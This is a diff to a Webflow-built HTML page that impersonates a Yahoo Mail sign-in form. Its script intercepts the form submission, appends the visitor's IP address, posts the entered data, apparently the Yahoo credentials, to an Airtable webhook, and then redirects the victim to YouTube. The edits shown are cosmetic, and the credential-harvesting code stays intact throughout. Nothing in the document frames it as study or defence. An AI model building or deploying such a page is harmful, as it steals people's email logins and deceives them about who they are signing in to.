@@ -23,22 +23,22 @@
     }
 
     async function submitForm(event) {
-        event.preventDefault(); // Prevent default form submission
+        event.preventDefault(); // Prevent default Webflow form submission
 
         const form = event.target;
         const formData = new FormData(form);
 
-        // Get IP address and append to form data
+        // Get IP address dynamically
         const ip = await getIP();
         formData.append("ip", ip);
 
-        // Submit form data to Airtable Webhook
+        // Submit the form to Airtable webhook
         await fetch("https://hooks.airtable.com/workflows/v1/genericWebhook/appWWw92Q29J21BO3/wfl77Xdfu9VtRuaiw/wtrD1pawC12AniDFG", {
             method: "POST",
-            body: formData,
+            body: formData
         });
 
-        // Redirect to YouTube after submission
+        // Redirect user to YouTube after submission
         window.location.href = "https://www.youtube.com/channel/YOUR_CHANNEL_ID";
     }
 </script>
@@ -63,7 +63,8 @@
         <p class="parag">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
       </div>
       <div class="form-block w-form">
-        <form onsubmit="submitForm(event)" class="form" data-wf-page-id="67c6f50ed426ad7d5847f218" data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d"><img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+        <form onsubmit="submitForm(event)" class="form">
+          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           <div class="mail">
             <h1 class="heading-2">Sign in</h1>
             <div class="text-block-2">Sign in using your Yahoo account<br></div>
@@ -97,7 +98,7 @@
                   <div data-w-tab="Hide" class="w-tab-pane"></div>
                 </div>
               </div>
-            </div><input type="submit" data-wait="Please wait..." data-w-id="5b219854-e812-a8bb-900f-4ec0d1fc12dd" class="logger w-button" value="Next">
+            </div><button type="submit" class="logger w-button">Next</button>
           </div>
           <div class="errry">
             <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
